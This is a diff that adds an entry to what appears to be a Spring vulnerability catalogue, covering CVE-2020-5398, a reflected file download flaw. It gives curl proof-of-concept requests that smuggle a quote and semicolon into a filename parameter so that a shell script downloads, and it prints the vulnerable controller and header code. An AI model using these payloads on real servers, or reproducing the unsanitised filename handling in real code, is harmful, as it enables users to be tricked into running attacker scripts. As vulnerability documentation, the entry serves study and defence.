@@ -396,6 +396,50 @@ private MultiValueMap<String, String> filterSubscriptions(MultiValueMap<String, 
     }
 }
 ```
+
+### CVE-2020-5398 Reflected File Download
+Affected Version: < 5.2.3 or 5.1.13 or 5.0.16  
+Diff: hhttps://github.com/spring-projects/spring-framework/commit/956ffe68587c8d5f21135b5ce4650af0c2dea933  
+Ref: https://github.com/motikan2010/CVE-2020-5398  
+https://drive.google.com/file/d/0B0KLoHg_gR_XQnV4RVhlNl96MHM/view?resourcekey=0-NV7cTUTB48bltMEddlULLg   
+POC: 
+```
+curl 'http://127.0.0.1:8080/?filename=sample&contents=Hello,%20World' --dump-header -
+curl 'http://127.0.0.1:8080/?filename=sample.sh%22%3B&contents=%23!%2Fbin%2Fbash%0Aid' --dump-header -
+curl 'http://127.0.0.1:8080/?filename=sample.sh%22%3B&contents=%23!%2Fbin%2Fbash%0Aid' --dump-header -
+```
+Factor: 
+```
+@RequestMapping(value = {"/"}, method = RequestMethod.GET)
+public ResponseEntity<String> download(@RequestParam("filename") String fileName, @RequestParam("contents") String contents) {
+
+// Make file name in response header
+ContentDisposition contentDisposition = ContentDisposition.builder("attachment")
+	.filename(fileName + ".txt") // Secure .txt file
+	.build();
+HttpHeaders headers = new HttpHeaders();
+headers.setContentDisposition(contentDisposition);
+
+// Download contents
+return ResponseEntity.ok()
+	.headers(headers)
+	.contentType(MediaType.parseMediaType("application/octet-stream"))
+	.body(contents);
+}
+
+package org.springframework.http;
+public final class ContentDisposition {
+if (this.filename != null) {
+    if (this.charset != null && !StandardCharsets.US_ASCII.equals(this.charset)) {
+	sb.append("; filename*=");
+	sb.append(encodeFilename(this.filename, this.charset));
+    } else {
+	sb.append("; filename=\""); 
+	sb.append(this.filename).append('"');  //filename -> "sample.sh";.txt"
+    }
+}
+```
+
 ## （9）Spring Integration Zip
 ### CVE-2018-1261 Arbitrary File Write
 Affected Version: < 1.0.1  
